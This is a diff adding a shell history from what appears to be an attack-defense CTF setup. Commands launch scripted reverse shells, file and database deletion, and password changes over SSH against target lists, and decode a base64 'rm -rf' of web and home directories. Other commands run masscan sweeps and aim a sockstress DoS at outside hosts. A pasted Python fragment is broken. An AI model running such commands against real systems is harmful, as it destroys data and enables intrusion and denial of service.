@@ -1,0 +1,1000 @@
+ 1020  ls
+ 1021  cd new_80/
+ 1022  ls
+ 1023  cd not_use/
+ 1024  ls
+ 1025  vi 2.py 
+ 1026  vi 3.py 
+ 1027  ls
+ 1028  vi js_attack.py 
+ 1029  vi js_exe.py 
+ 1030  ls
+ 1031  cd ..
+ 1032  ls
+ 1033  vi file_write.py 
+ 1034  python file_write.py 
+ 1035  ls
+ 1036  cd not_use/
+ 1037  ls
+ 1038  vi js_attack.py 
+ 1039  ls
+ 1040  cd /
+ 1041  find / -name tamper.py
+ 1042  ls
+ 1043  cd
+ 1044  ls
+ 1045  cd awd_src
+ 1046  ls
+ 1047  cd 103
+ 1048  ls
+ 1049  cd web
+ 1050  ls
+ 1051  cd flag/
+ 1052  LS
+ 1053  ls
+ 1054  cd ..
+ 1055  ls
+ 1056  cd html/
+ 1057  ls
+ 1058  s
+ 1059  ls
+ 1060  a
+ 1061  ls
+ 1062  cd ..
+ 1063  ls
+ 1064  cd web
+ 1065  ls
+ 1066  cd html/
+ 1067  ls
+ 1068  cd backups/
+ 1069  ls
+ 1070  cd ..
+ 1071  ls
+ 1072  cd ..
+ 1073  ls
+ 1074  cd html/
+ 1075  ls
+ 1076  cd ..
+ 1077  ls
+ 1078  cd ..
+ 1079  s
+ 1080  ls
+ 1081  cd awd
+ 1082  ls
+ 1083  cd /root
+ 1084  ls
+ 1085  cd awd_src
+ 1086  ls
+ 1087  cd ..
+ 1088  ls
+ 1089  cd awd
+ 1090  s
+ 1091  ls
+ 1092  cd docker/
+ 1093  ls
+ 1094  docker-compose  up
+ 1095  ls
+ 1096  vi /etc/default/docker 
+ 1097  service docker restart
+ 1098  docker-compose  up
+ 1099  docker ps
+ 1100  docker exec -ti e9a278e61c81 /bin/bash
+ 1101  ssh 192.168.2.81 -p2222
+ 1102  ls
+ 1103  cd awd_src
+ 1104  ls
+ 1105  cd 103
+ 1106  ls
+ 1107  cd web
+ 1108  ls
+ 1109  cd html/
+ 1110  ls
+ 1111  cd data/
+ 1112  ls
+ 1113  cd users/
+ 1114  cd ..
+ 1115  ls
+ 1116  cd pages/
+ 1117  ls
+ 1118  cd ..
+ 1119  ls
+ 1120  cd users/
+ 1121  ls
+ 1122  cat admin.xml 
+ 1123  docker ps
+ 1124  docker exec -ti 2f /bin/bash
+ 1125  ls
+ 1126  cd awd
+ 1127  ls
+ 1128  cd ..
+ 1129  ls
+ 1130  cd awd
+ 1131  ls
+ 1132  cd attack/
+ 1133  ls
+ 1134  cd ctf_hack/
+ 1135  ls
+ 1136  cd hack/
+ 1137  ls
+ 1138  cd new_80/
+ 1139  ls
+ 1140  cd not_use/
+ 1141  ls
+ 1142  vi 1.py 
+ 1143  l
+ 1144  ls
+ 1145  vi 2.py 
+ 1146  ls
+ 1147  vi 2.py 
+ 1148  vi login.py 
+ 1149  ls
+ 1150  vi file_write.py 
+ 1151  ls
+ 1152  vi js_exe.py 
+ 1153  ls
+ 1154  ls -la
+ 1155  ifconfig
+ 1156  ifconfig | head -n20
+ 1157  dhclient br0
+ 1158  ls
+ 1159  ifconfig
+ 1160  ifconfig |head -n 20
+ 1161  ifconfig
+ 1162  ifconfig |head -n 20
+ 1163  dhclient br0
+ 1164  ifconfig |head -n 20
+ 1165  ifconfig |
+ 1166  ifconfig |head -n 20
+ 1167  dhclient br0
+ 1168  ping 192.168.37.1
+ 1169  dhclient ens33
+ 1170  ifconfig
+ 1171  ping baidu.com
+ 1172  ifconfig
+ 1173  ping baidu.com
+ 1174  dhclient ens33
+ 1175  ping 192.168.2.81
+ 1176  ping 192.168.2.69
+ 1177  ls
+ 1178  ifconfig
+ 1179  route -n
+ 1180  route add -net 0.0.0.0/0 gw 192.168.2.1 dev ens33
+ 1181  route -n
+ 1182  ping baidu.com
+ 1183  route del -net 0.0.0.0/0 gw 192.168.2.1 dev br0
+ 1184  ping baidu.com
+ 1185  ping 192.168.2.1
+ 1186  ping baidu.com
+ 1187  ping 192.168.2.1
+ 1188  ifconfig br0  down
+ 1189  ping 192.168.2.1
+ 1190  ping baidu.com
+ 1191  ls
+ 1192  vi 1.py 
+ 1193  ls
+ 1194  route -n
+ 1195  ifconfig
+ 1196  ifconfig | head -n 30
+ 1197  ping baidu.com
+ 1198  ping baidu.com -c 1
+ 1199  ls -la
+ 1200  ifconfig
+ 1201  ping baidu.com
+ 1202  reboot
+ 1203  tmux attach
+ 1204  ls
+ 1205  tmux
+ 1206  tmux 
+ 1207  ls
+ 1208  rz
+ 1209  cd
+ 1210  cd /tmp
+ 1211  ls
+ 1212  rz
+ 1213  ls
+ 1214  tmux attach
+ 1215  tmux attach
+ 1216  ls
+ 1217  cd ctf
+ 1218  ls
+ 1219  mkdir hxb2017
+ 1220  cd hxb2017/
+ 1221  ls
+ 1222  sz
+ 1223  rz
+ 1224  rz -E
+ 1225  ls
+ 1226  unzip pwn100.zip 
+ 1227  ls
+ 1228  chmod +x pwns
+ 1229  ./pwns 
+ 1230  ls
+ 1231  ./pwns
+ 1232  ls -la
+ 1233  vi pwns
+ 1234  ./pwns
+ 1235  file pwns
+ 1236  ldd pwns
+ 1237  ldd pwns4
+ 1238  4
+ 1239  ls
+ 1240  tmux attach
+ 1241  cd awd_src/
+ 1242  ls
+ 1243  cd test/
+ 1244  ls
+ 1245  rz -E
+ 1246  ls
+ 1247  tmux attach
+ 1248  cd ctf
+ 1249  cd hxb2017/
+ 1250  ls
+ 1251  scp test.py mut-orff.org:/var/www/html/music/file/
+ 1252  ls
+ 1253  curl http://118.190.113.111:10080/upload/b03ddfacf31cef86179b28dcd7730f5e.jpg
+ 1254  curl http://118.190.113.111:10080/upload/b03ddfacf31cef86179b28dcd7730f5e.jpg -v
+ 1255  curl http://118.190.113.111:10080/upload/fc38c7b0dfc4c0d37daad7569e10757c.jpg
+ 1256  curl http://118.190.113.111:10080/upload/fc38c7b0dfc4c0d37daad7569e10757c.jpg -v
+ 1257  v
+ 1258  ls
+ 1259  exit
+ 1260  tmux
+ 1261  tmux attach
+ 1262  ls
+ 1263  cd /root/.ssh
+ 1264  ls
+ 1265  cat id_rsa.pub 
+ 1266  cp id_rsa.pub  authorized_keys
+ 1267  ls
+ 1268  exit
+ 1269  ls
+ 1270  cd awd_src
+ 1271  ls
+ 1272  cd onethink
+ 1273  ls
+ 1274  cd ..
+ 1275  ls
+ 1276  ./onethink.sh 
+ 1277  tmux attach
+ 1278  ls
+ 1279  exit
+ 1280  ls
+ 1281  cd c
+ 1282  cd ctf-framework/
+ 1283  ls
+ 1284  cd log
+ 1285  ls
+ 1286  cd so
+ 1287  cd spec
+ 1288  ls
+ 1289  tail -f 118.190.78.155\:80 
+ 1290  ls
+ 1291  echo > 118.190.78.155\:80 
+ 1292  ls
+ 1293  tail -f 118.190.78.155\:80 
+ 1294  ls
+ 1295  vi 172.17.0.6\:80 
+ 1296  tail -f 172.17.0.6\:80 1
+ 1297  tail -f 172.17.0.6\:80 
+ 1298  ls
+ 1299  vi 8.8.8.8\:80 
+ 1300  tail -f 8.8.8.8\:80 
+ 1301  ls
+ 1302  cd ..
+ 1303  ls
+ 1304  cd ..
+ 1305  ls
+ 1306  cd data/
+ 1307  ls
+ 1308  vi status.data 
+ 1309  cat status.data 
+ 1310  ls
+ 1311  cat status.data 
+ 1312  ls
+ 1313  cat status.data 
+ 1314  ls
+ 1315  cat status.data 
+ 1316  ls
+ 1317  cat status.data 
+ 1318  cd ..
+ 1319  cd script/
+ 1320  ls
+ 1321  vi http_dos.py 
+ 1322  ls
+ 1323  cd ..
+ 1324  ls
+ 1325  vi utils/
+ 1326  vi utils/log.py
+ 1327  vi utils/color.py
+ 1328  ls
+ 1329  cd utils/
+ 1330  ls
+ 1331  vi __init__.py
+ 1332  cd ..
+ 1333  ls
+ 1334  cd framework/
+ 1335  vi __init__.py
+ 1336  ls
+ 1337  cd ..
+ 1338  ls
+ 1339  cd data/
+ 1340  ls
+ 1341  cat status.data 
+ 1342  ping baidu.com
+ 1343  ping 8.8.8.8
+ 1344  ls
+ 1345  vi 
+ 1346  la
+ 1347  ls
+ 1348  ping baidu.com
+ 1349  nslookup baidu.com 8.8.8.8
+ 1350  ping baidu.com
+ 1351  vi /etc/resolv.conf 
+ 1352  ping baidu.com
+ 1353  ping 8.8.8.8
+ 1354  ping 114.114.114.114
+ 1355  vi /etc/hosts
+ 1356  ping 192.30.253.112
+ 1357  exit
+ 1358  ls
+ 1359  cd ctf-framework/
+ 1360  ls
+ 1361  exit
+ 1362  tmux attach
+ 1363  tmux 
+ 1364  s
+ 1365  cd awd_src/
+ 1366  ;s
+ 1367  ls
+ 1368  cd 103
+ 1369  ls
+ 1370  sz packages
+ 1371  **01000000039a32Š
+ 1372  sz packages.tgz 
+ 1373  rz -E
+ 1374  tmux attach
+ 1375  tmux attach
+ 1376  tmux attach
+ 1377  cd ctf-framework/
+ 1378  ls
+ 1379  python replay.py 
+ 1380  exit
+ 1381  tmux attach
+ 1382  tmux attach
+ 1383  tmux 
+ 1384  docker run -ti web_14.04 /bin/bash
+ 1385  exit
+ 1386  docker ps
+ 1387  docker run -ti web_14.04 /bin/bash
+ 1388  exit
+ 1389  ssh music
+ 1390  ls
+ 1391  cd awd
+ 1392  ls
+ 1393  cd attack/
+ 1394  ls
+ 1395  cd ctf
+ 1396  cd ctf_hack/
+ 1397  ls
+ 1398  cd hack/
+ 1399  ls
+ 1400  cd 80
+ 1401  ls
+ 1402  vi sample.py
+ 1403  exit
+ 1404  ssh music
+ 1405  ls
+ 1406  cd ctf-framework/
+ 1407  ls
+ 1408  mv ssh autossh
+ 1409  ls
+ 1410  cd autossh/
+ 1411  ls
+ 1412  mv auto_ssh.py  ../
+ 1413  cd ..
+ 1414  ls
+ 1415  vi auto_ssh.py 
+ 1416  ls
+ 1417  python auto_ssh.py autossh/now.txt  ls
+ 1418  python auto_ssh.py autossh/now.txt  "ls -la"
+ 1419  ls
+ 1420  chmod +x auto_ssh.py  check.py 
+ 1421  ls
+ 1422  vi auto_ssh.py 
+ 1423  python auto_ssh.py autossh/now.txt ls
+ 1424  python auto_ssh.py autossh/now.txt reverse_shell
+ 1425  vi auto_ssh.py 
+ 1426  python auto_ssh.py  
+ 1427  python auto_ssh.py autossh/now.txt reverse_shell
+ 1428  vi auto_ssh.py 
+ 1429  python auto_ssh.py autossh/now.txt reverse_shell
+ 1430  vi auto_ssh.py 
+ 1431  python auto_ssh.py autossh/now.txt reverse_shell
+ 1432  ls
+ 1433  vi auto_ssh.py 
+ 1434  python auto_ssh.py autossh/now.txt rm_db
+ 1435  vi auto_ssh.py 
+ 1436  python auto_ssh.py autossh/now.txt rm_db
+ 1437  vi auto_ssh.py 
+ 1438  vi framework/config.py
+ 1439  python auto_ssh.py autossh/now.txt rm_db
+ 1440  python auto_ssh.py autossh/now.txt rm_file
+ 1441  vi framework/config.py
+ 1442  vi auto_ssh.py 
+ 1443  python auto_ssh.py autossh/now.txt rm_file
+ 1444  echo cm0gLXJmIC92YXIvd3d3L2h0bWwvaW5kZXgucGhwIC90bXAvKiAvaG9tZS9jdGYvKg== | base64 -d
+ 1445  ls
+ 1446  git add .
+ 1447  git commit -m "add auto_ssh"
+ 1448  git push
+ 1449  ls
+ 1450  cd ..
+ 1451  ls
+ 1452  cd ctf-framework/
+ 1453  ls
+ 1454  cd ..
+ 1455  ls
+ 1456  mkdir hxb2017
+ 1457  cp ctf-framework/ -r hxb2017/
+ 1458  cd hxb2017/
+ 1459  ls
+ 1460  mkdir scan
+ 1461  cd scan
+ 1462  ls
+ 1463  git clone https://github.com/robertdavidgraham/masscan
+ 1464  ls
+ 1465  cd ..
+ 1466  ls
+ 1467  cd ..
+ 1468  ls
+ 1469  service apache2 start
+ 1470  ifconfig
+ 1471  ls
+ 1472  cd tools
+ 1473  ls
+ 1474  git pull
+ 1475  ls
+ 1476  cd waf
+ 1477  ls
+ 1478  cd ..
+ 1479  ls
+ 1480  cd static_python/
+ 1481  ls
+ 1482  ls -la
+ 1483  chmod +x python2.7-static 
+ 1484  ./python2.7-static 
+ 1485  ls
+ 1486  cd ..
+ 1487  ls
+ 1488  cd trash_traffic/
+ 1489  ls
+ 1490  vi trash.py
+ 1491  cat host_web.txt 
+ 1492  ls
+ 1493  vi web_trash.py 
+ 1494  vi trash.py
+ 1495  ls
+ 1496  python web_trash.py 
+ 1497  python web_trash.py  5
+ 1498  killall python
+ 1499  ls
+ 1500  vi host_web.txt 
+ 1501  python web_trash.py  5
+ 1502  ls
+ 1503  vi web_trash.py 
+ 1504  python web_trash.py  5
+ 1505  ls
+ 1506  vi readme.txt
+ 1507  ls
+ 1508  cd .
+ 1509  cd ..
+ 1510  ls
+ 1511  cd ..
+ 1512  ls
+ 1513  cd ctf-framework/
+ 1514  ls
+ 1515  vi autossh/
+ 1516  cd autossh/
+ 1517  ls
+ 1518  cp targets friends.txt
+ 1519  vi friends.txt 
+ 1520  ls
+ 1521  cd ..
+ 1522  ls
+ 1523  ls -al
+ 1524  ls
+ 1525  cd ..
+ 1526  ls
+ 1527  cd tools
+ 1528  ls
+ 1529  cd ..
+ 1530  ls
+ 1531  cd ..
+ 1532  ls
+ 1533  cd hxb2017/
+ 1534  ls
+ 1535  cd ctf-framework/
+ 1536  ls
+ 1537  cd ..
+ 1538  ls
+ 1539  cd  ..
+ 1540  tar cvfz hxb2017.tgz hxb2017/
+ 1541  ls
+ 1542  cd ctf-framework/
+ 1543  ls
+ 1544  cd script/
+ 1545  ls
+ 1546  python run.py -m sample3 -c ls -t mut-orff.org:8080 
+ 1547  cd ..
+ 1548  python run.py -m sample3 -c ls -t mut-orff.org:8080 
+ 1549  python run.py -m sample3 -c ls -t mut-orff.org:8080  -l 1
+ 1550  ping baidu.com
+ 1551  python run.py -m sample3 -c ls -t mut-orff.org:8080  -l 1
+ 1552  wget mut-orff.org
+ 1553  ping 118.190.78.155
+ 1554  python run.py -m sample3 -c ls -t mut-orff.org:8080  -l 1
+ 1555  ls
+ 1556  cd seq
+ 1557  ls
+ 1558  cd test
+ 1559  ls
+ 1560  vi config.py
+ 1561  vi 4.txt 
+ 1562  vi 3.txt
+ 1563  cd ..
+ 1564  ls
+ 1565  cd ..
+ 1566  cd awd
+ 1567  cd ..
+ 1568  cd awd
+ 1569  ls
+ 1570  cd script/
+ 1571  ls
+ 1572  cd Attack_Defense_Framework/
+ 1573  ls
+ 1574  vi port-forwarding.py 
+ 1575  ls
+ 1576  vi fake_requests.py 
+ 1577  ls
+ 1578  cd core/
+ 1579  ls
+ 1580  cd obfs/
+ 1581  ls
+ 1582  vi fake_payloads.py 
+ 1583  ls
+ 1584  vi get_arg.py 
+ 1585  cd ..
+ 1586  ls
+ 1587  cd ..
+ 1588  ls
+ 1589  cd deamon/
+ 1590  ls
+ 1591  vi bash.txt 
+ 1592  ls
+ 1593  cd ..
+ 1594  ls
+ 1595  cd sources/
+ 1596  ls
+ 1597  vi gsconfig.php 
+ 1598  ls
+ 1599  cd plugins/
+ 1600  ls
+ 1601  cd ..
+ 1602  ls
+ 1603  cd ..
+ 1604  ls
+ 1605  cd ssh
+ 1606  ls
+ 1607  vi auto_ssh.py 
+ 1608  rm .auto_ssh.py.swp 
+ 1609  vi auto_ssh.py 
+ 1610  ls
+ 1611  vi targets 
+ 1612  python auto_ssh.py -h
+ 1613  python auto_ssh.py targets ls
+ 1614  vi targets 
+ 1615  python auto_ssh.py targets ls
+ 1616  vi auto_ssh.py 
+ 1617  python auto_ssh.py targets ls
+ 1618  vi auto_ssh.py 
+ 1619  python auto_ssh.py targets ls
+ 1620  python auto_ssh.py targets "ls -la"
+ 1621  vi success.log 
+ 1622  vi auto_ssh.py 
+ 1623  python auto_ssh.py targets change_password
+ 1624  vi auto_ssh.py 
+ 1625  python auto_ssh.py targets change_password
+ 1626  echo Y2hhbmdlX3Bhc3N3b3Jk | base64 -d
+ 1627  vi auto_ssh.py 
+ 1628  ls
+ 1629  vi targets 
+ 1630  vi now.txt 
+ 1631  vi targets 
+ 1632  vi auto_ssh.py 
+ 1633  ls
+ 1634  vi success.log 
+ 1635  python auto_ssh.py targets change_password
+ 1636  python auto_ssh.py now.txt change_password
+ 1637  python auto_ssh.py now.txt "ls -la /"
+ 1638  ls
+ 1639  vi auto_ssh.py 
+ 1640  python auto_ssh.py now.txt reverse_shell
+ 1641  python auto_ssh.py now.txt 
+ 1642  python auto_ssh.py now.txt  get_flag
+ 1643  ls
+ 1644  cd ..
+ 1645  ls
+ 1646  cp -r ssh/ /root/ctf-framework/
+ 1647  LS
+ 1648  cd ..
+ 1649  ls
+ 1650  cd ..
+ 1651  ls
+ 1652  cd ..
+ 1653  ls
+ 1654  cd awd
+ 1655  ls
+ 1656  cd ..
+ 1657  ls
+ 1658  cd hxb2017/
+ 1659  ls
+ 1660  mkdir waf
+ 1661  ls
+ 1662  cd waf
+ 1663  ls
+ 1664  wget mut-orff:23456/my_waf.tgz
+ 1665  wget mut-orff:12345/my_waf.tgz
+ 1666  wget mut-orff.org:12345/my_waf.tgz
+ 1667  wget mut-orff.org:23456/my_waf.tgz
+ 1668  ls
+ 1669  tar xvfz my_waf.tgz 
+ 1670  ls
+ 1671  cd my_waf/
+ 1672  ls
+ 1673  vi waf.php 
+ 1674  ls
+ 1675  cls
+ 1676  cd ..
+ 1677  ls
+ 1678  cd ..
+ 1679  ls
+ 1680  mkdir tools
+ 1681  mv scan/ tools/
+ 1682  mv waf/ tools/
+ 1683  ls
+ 1684  cd tools
+ 1685  ls
+ 1686  git init.
+ 1687  git init .
+ 1688  ls
+ 1689  git add .
+ 1690  ls
+ 1691  git commit -m "first commit"
+ 1692  git push'
+ 1693  git push
+ 1694  git add remote origin  git@github.com:haoziwansui/tools
+ 1695  git  remote add  origin  git@github.com:haoziwansui/tools
+ 1696  git push
+ 1697  ls
+ 1698  mkdir phptest
+ 1699  cd phptest/
+ 1700  wget https://raw.githubusercontent.com/haoziwansui/awd-tools/master/phptest.php
+ 1701  ls
+ 1702  cd ..
+ 1703  ls
+ 1704  cd waf
+ 1705  ls
+ 1706  cd my_waf/
+ 1707  ls
+ 1708  wget #!/usr/bin/python
+ 1709  # -*- coding: utf-8 -*-
+ 1710  import os
+ 1711  import re
+ 1712  import time
+ 1713  pathdir = '/yjdata/www/'
+ 1714  #pathdir = '/var/www/html/phpmyadmin'
+ 1715  wafpath = '/yjdata/www/waf/waf.php'
+ 1716  #wafpath = '/var/www/html/waf/waf.php'
+ 1717  #wafpath = '/var/www/html/waf/capture.php'
+ 1718  #wafpath = '/var/www/html/waf/ip_forbidden.php'
+ 1719  wis = 'php|pht'
+ 1720  filepaths = []
+ 1721  for fpathe,dirs,fs in os.walk(pathdir):
+ 1722  for f in fs:; (fpathe,f)
+ 1723  if os.path.isfile(ppp) and re.match(r'^\.('+wis+')$',os.path.splitext(ppp)[1]):
+ 1724  filepaths.append(ppp)
+ 1725  for f in filepaths:; if f!=wafpath:
+ 1726  print f
+ 1727  wget https://raw.githubusercontent.com/haoziwansui/awd-tools/master/waf/setup.py
+ 1728  ls
+ 1729  vi setup.py 
+ 1730  ls
+ 1731  cd ..
+ 1732  ls
+ 1733  cd ..
+ 1734  ls
+ 1735  cd waf/
+ 1736  mkdir file_check
+ 1737  mv file_check.zip file_check/
+ 1738  ls
+ 1739  rm -r file_check/
+ 1740  ls
+ 1741  cd ..
+ 1742  ls
+ 1743  mkdir file_check
+ 1744  ls
+ 1745  mv file_check.zip  file_check
+ 1746  ls
+ 1747  cd file_check/
+ 1748  ls
+ 1749  unzip file_check.zip 
+ 1750  ls
+ 1751  cd ..
+ 1752  ls
+ 1753  cd file_check/
+ 1754  ls
+ 1755  cd file_check/
+ 1756  l
+ 1757  ls
+ 1758  vi file_check.py 
+ 1759  ls
+ 1760  cd ..
+ 1761  ls
+ 1762  cd ..
+ 1763  ls
+ 1764  cd waf
+ 1765  ls
+ 1766  cd my_waf/
+ 1767  ls
+ 1768  cd log
+ 1769  s
+ 1770  ls
+ 1771  cd ..
+ 1772  ls
+ 1773  vi setup.py 
+ 1774  ls
+ 1775  vi setup.py 
+ 1776  ls
+ 1777  vi waf.php 
+ 1778  ls
+ 1779  cd ..
+ 1780  ls
+ 1781  cd ..
+ 1782  ls
+ 1783  cd ..
+ 1784  ls
+ 1785  cd tools/
+ 1786  ls
+ 1787  git add .
+ 1788  git commit -m "haozi"
+ 1789  git push
+ 1790  ls
+ 1791  cd ..
+ 1792  ls
+ 1793  cd tools/
+ 1794  ls
+ 1795  cd scan
+ 1796  ls
+ 1797  cd masscan/
+ 1798  ls
+ 1799  make
+ 1800  ls
+ 1801  make
+ 1802  apt-get install clang
+ 1803  ls
+ 1804  cd ..
+ 1805  ls
+ 1806  cd ..
+ 1807  ls
+ 1808  apt-get install clang
+ 1809  ping 8.8.8.8
+ 1810  nslookup mirrors.aliyun.com
+ 1811  nslookup mirrors.aliyun.com 8.8.8.8
+ 1812  vi /etc/resolv.conf 
+ 1813  nslookup mirrors.aliyun.com 8.8.8.8
+ 1814  apt-get install clang
+ 1815  ls
+ 1816  cd scan
+ 1817  ls
+ 1818  cd masscan/
+ 1819  ls
+ 1820  make
+ 1821  ls
+ 1822  cd bin/
+ 1823  ls
+ 1824  ln -s ~/hxb2017/tools/scan/masscan/bin/masscan  /usr/bin/masscan
+ 1825  masscan 
+ 1826  masscan  -p80 10.0.0.0/8 --banners -oB 1.txt
+ 1827  masscan  -p80 192.168.8.0/24 --banner
+ 1828  masscan  -p80 192.168.8.0/24 --banner -oB 1.txt
+ 1829  ls
+ 1830  vi 1.txt 
+ 1831  ifconfig
+ 1832  masscan  -p80 192.168.18.0/24 --banner -oB 1.txt
+ 1833  ls
+ 1834  vi 1.txt 
+ 1835  cat 1.txt 
+ 1836  masscan 
+ 1837  masscan  -p80 192.168.18.0/24 --banner -oX 1.txt
+ 1838  ls
+ 1839  vi 1.txt 
+ 1840  masscan  -p80,22,3306 192.168.18.0/24 --banner -oX 1.txt
+ 1841  ls
+ 1842  vi 1.txt 
+ 1843  ls
+ 1844  vi example.txt
+ 1845  ls
+ 1846  cd //
+ 1847  cd -
+ 1848  ls
+ 1849  cd ..
+ 1850  ls
+ 1851  cd ..
+ 1852  ls
+ 1853  cd ..
+ 1854  git pull
+ 1855  ls
+ 1856  cd ddos/
+ 1857  ls
+ 1858  cd sockstress/
+ 1859  ls
+ 1860  ./sockstress 
+ 1861  ls
+ 1862  cat README.txt 
+ 1863  ls
+ 1864  cd ..
+ 1865  ls
+ 1866  cat README.md 
+ 1867  cd sockstress/
+ 1868  ls
+ 1869  ./sockstress mut-orff.org:80 ens33
+ 1870  nslookup music
+ 1871  nslookup mut-orff.org
+ 1872  ./sockstress  118.190.78.155:80 ens33
+ 1873  ls
+ 1874  cd ..
+ 1875  ls
+ 1876  cd ..
+ 1877  ls
+ 1878  cp ddos/sockstress/sockstress .
+ 1879  cp ddos/synflood/synflood .
+ 1880  ls
+ 1881  mv sockstress  synflood  ../ctf-framework/script/
+ 1882  cp ddos/README.md  ../ctf-framework/script/
+ 1883  ls
+ 1884  cd ..
+ 1885  ls
+ 1886  cd ctf-framework/
+ 1887  ls
+ 1888  cd script/
+ 1889  ls
+ 1890  cd ..
+ 1891  ls
+ 1892  git add .
+ 1893  git commit -m "add ddos binary"
+ 1894  git push
+ 1895  ls
+ 1896  cd ..
+ 1897  ls
+ 1898  cd tools/
+ 1899  ls
+ 1900  cd phptest/
+ 1901  ls
+ 1902  cd ..
+ 1903  ls
+ 1904  cd ..
+ 1905  ls
+ 1906  cd ctf-framework/
+ 1907  ls
+ 1908  cd ..
+ 1909  ls
+ 1910  ls
+ 1911  df -h
+ 1912  cd ctf-framework/
+ 1913  ls
+ 1914  git fetch
+ 1915  git merge origin/master
+ 1916  rm data/status.data  log/sys.log log/spec/mut-orff.org:8080
+ 1917  git merge origin/master
+ 1918  ls
+ 1919  cd log/
+ 1920  ls
+ 1921  cd spec/
+ 1922  ls
+ 1923  rm *
+ 1924  ls
+ 1925  cd ..
+ 1926  ls
+ 1927  vi sys.log 
+ 1928  echo > sys.log 
+ 1929  ls
+ 1930  cd..
+ 1931  ls
+ 1932  cd ..
+ 1933  ls
+ 1934  cd data/
+ 1935  ls
+ 1936  cd ..
+ 1937  ls
+ 1938  cd Reverse-Shell-Manager/
+ 1939  ls
+ 1940  python Reverse-Shell-Manager.py 192.168.37.133 6666
+ 1941  ls
+ 1942  cd ..
+ 1943  ls
+ 1944  cd ..
+ 1945  ls
+ 1946  cd /var/www/html/
+ 1947  ls
+ 1948  cd rhg/
+ 1949  ls
+ 1950  cd ..
+ 1951  ls
+ 1952  wge mut-orff.org/file/rips.tgz
+ 1953  wget mut-orff.org/file/rips.tgz
+ 1954  ls
+ 1955  tar xvfz rips.tgz 
+ 1956  ls
+ 1957  exit
+ 1958  tmux attach
+ 1959  ls
+ 1960  tmux
+ 1961  rz -E
+ 1962  ls
+ 1963  mv file_check.zip  hxb2017/tools/
+ 1964  tmux attach
+ 1965  tmux
+ 1966  tmux attach
+ 1967  df -h
+ 1968  ls
+ 1969  sz hxb2017.tgz 
+ 1970  tmux attach
+ 1971  ssh ctf@172.16.0.68
+ 1972  exit
+ 1973  tcpdump -i ens33 port 80 -w 1.pcap
+ 1974  tcpdump -i any port 80 -w 1.pcap
+ 1975  6
+ 1976  7
+ 1977  5
+ 1978  vir
+ 1979  ls
+ 1980  0
+ 1981  cd hxb2017/
+ 1982  ls
+ 1983  s
+ 1984  ls
+ 1985  s
+ 1986  ls
+ 1987  tar xvfz rips.tgz 
+ 1988  ls
+ 1989  wget mut-orff.org/file/rips.tgz
+ 1990  exit
+ 1991  ssh 172.16.0.66
+ 1992  ssh pwn4@172.16.0.66
+ 1993  ssh ctf@172.16.0.65
+ 1994  ssh ctf@172.16.0.69
+ 1995  tmux attach
+ 1996  ls
+ 1997  cd hxb2017/
+ 1998  ls
+ 1999  cd ctf-framework
+ 2000  ls
+ 2001  cd ..
+ 2002  ls
+ 2003  cd ctf-framework
+ 2004  ls
+ 2005  history
+ 2006  history 
+ 2007  ls
+ 2008  vi auto_ssh.py 
+ 2009  cd autossh/
+ 2010  ls
+ 2011  vi gen.py 
+ 2012  ls
+ 2013  rm .gen.py.swp 
+ 2014  vi gen.py 
+ 2015  ls
+ 2016  sz gen.py 
+ 2017  ls
+ 2018  history 
+ 2019  history  | cat > his
